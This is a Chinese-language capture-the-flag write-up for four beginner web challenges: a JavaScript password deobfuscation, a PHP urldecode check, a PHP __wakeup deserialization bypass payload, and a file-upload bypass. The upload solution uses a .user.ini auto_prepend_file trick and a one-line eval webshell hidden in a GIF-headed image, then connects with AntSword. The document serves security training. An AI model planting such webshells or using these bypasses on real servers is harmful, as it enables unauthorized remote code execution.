### simple_js

默认弹出窗口，先 f12，查看源代码，发现 js 代码如下

```html
<html>
  <head>
    <title>JS</title>
    <script type="text/javascript">
      function dechiffre(pass_enc) {
        var pass = "70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65";
        var tab = pass_enc.split(",");
        var tab2 = pass.split(",");
        var i,
          j,
          k,
          l = 0,
          m,
          n,
          o,
          p = "";
        i = 0;
        j = tab.length;
        k = j + l + (n = 0);
        n = tab2.length;
        for (i = o = 0; i < (k = j = n); i++) {
          o = tab[i - l];
          p += String.fromCharCode((o = tab2[i]));
          if (i == 5) break;
        }
        for (i = o = 0; i < (k = j = n); i++) {
          o = tab[i - l];
          if (i > 5 && i < k - 1) p += String.fromCharCode((o = tab2[i]));
        }
        p += String.fromCharCode(tab2[17]);
        pass = p;
        return pass;
      }
      String["fromCharCode"](
        dechiffre(
          "\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"
        )
      );

      h = window.prompt("Enter password");
      alert(dechiffre(h));
    </script>
  </head>
</html>
```

分析得出，无论弹出的对话框输入密码正确与否都只会返回同一个字符串；

真正的密码就是这以下代码中的 16 进制加密数据

```js
String["fromCharCode"](
  dechiffre(
    "\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"
  )
);
```

<br>

同样的，直接在开发者工具的控制台内使用 String 函数对这段编码进行解码

之后编码转换，直接获取 flag

flag 为 `786OsErtk12`

> 注意提交是的格式！！！所以正确答案应该为 cyberspace{786OsErtk12}

![](../imgs/contest/xctf_noob/xn1.png)

<br>

### PHP2

> php 是给开发者看的源代码，phps 是为了直接在网页中查看 php 源码而设计的文件

通过 index.phps 获取网页 php 源代码

```php
<?php
if("admin"===$_GET[id]) {
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "admin")
{
  echo "<p>Access granted!</p>";
  echo "<p>Key: xxxxxxx </p>";
}
?>
```

<br>

### unserialize3

目的：通过反序列化绕过魔法函数 wakeup

原理：  
当执行反序列化时会首先运行魔法函数 `__wakeup()`；我们需要绕过该魔法函数才能正确获取 flag  
仅需使序列化成员数大于实际成员数即可！

打开 phpstorm，写入以下代码，获取类 xctf 的序列化内容

```php
<?php
class xctf
{
    public $flag = '111';

    public function __wakeup()
    {
        exit('bad requests');
    }
}

$a=new xctf();
var_dump(serialize($a));
```

<br>

得到的序列化内容：  
`O:4:"xctf":1:{s:4:"flag";s:3:"111";}`

我们增加实际成员数，即把 1 改成 2，此时得到：  
`O:4:"xctf":2:{s:4:"flag";s:3:"111";}`

<br>

将该序列化内容作为负载写入 URL  
`xxx.xxx.xxx.xxx/index.php?code=O:4:"xctf":2:{s:4:"flag";s:3:"111";}`

即可绕过 wakeup 获取正确的 flag

<br>

### easyupload

题解：利用 .user.ini 配置文件挂载后门程序，使用蚁剑链接得到 flag

可以先制作一个 `.user.ini` 文件

```ini
GIF89a
auto_prepend_file=a.jpg
```

在制作一个带一句话木马的图片 `a.jpg`

```php
GIF89a
<?=eval($_POST['cmd']);?>
```

<br>

使用 burp 拦截每一次上传请求，把 content-type 全部改为 image/jpg，这样才可以绕过类型检测

完毕后中国蚁剑找到文件上传点，链接即可

<br>
